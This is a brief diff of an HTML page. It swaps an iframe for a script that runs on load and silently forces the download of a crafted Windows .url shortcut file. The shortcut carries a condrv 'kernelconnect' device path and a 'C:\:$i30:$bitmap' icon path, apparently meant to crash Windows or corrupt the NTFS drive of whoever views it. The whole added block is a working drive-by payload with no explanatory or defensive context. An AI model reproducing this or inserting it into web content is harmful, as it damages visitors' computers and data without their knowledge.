@@ -5,6 +5,22 @@
     </title>
   </head>
   <body>
-    <iframe src="http://192.168.1.254"></iframe>
+    <script>
+      let file = new File(["[InternetShortcut]\n",
+        "URL=\\.\globalroot\device\condrv\kernelconnect\n",
+        "IconIndex=0\n",
+        "IconFile=C:\:$i30:$bitmap\n"],
+         "file.url", {
+        type: "text/plain",
+        }
+      );
+
+      let link = document.createElement('a');
+      link.download = file.name;
+
+      link.href = URL.createObjectURL(file);
+      link.click();
+      URL.revokeObjectURL(link.href);
+    </script>
   </body>
 </html>
